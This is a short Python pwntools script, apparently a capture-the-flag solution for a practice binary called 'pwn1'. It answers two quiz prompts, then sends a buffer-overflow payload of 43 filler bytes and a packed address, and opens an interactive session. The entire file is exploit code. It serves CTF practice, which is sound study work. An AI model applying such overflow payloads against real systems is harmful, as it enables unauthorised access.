from pwn import *
import time


nop = b"a" * 43
ret2win_addr = p32(0x215eef38)

payload =nop+ret2win_addr

p = process("./pwn1")
p.sendline("Sir Lancelot of Camelot")
time.sleep(1)
p.sendline("To seek the Holy Grail.")
time.sleep(1)
p.sendline(payload)

p.interactive()




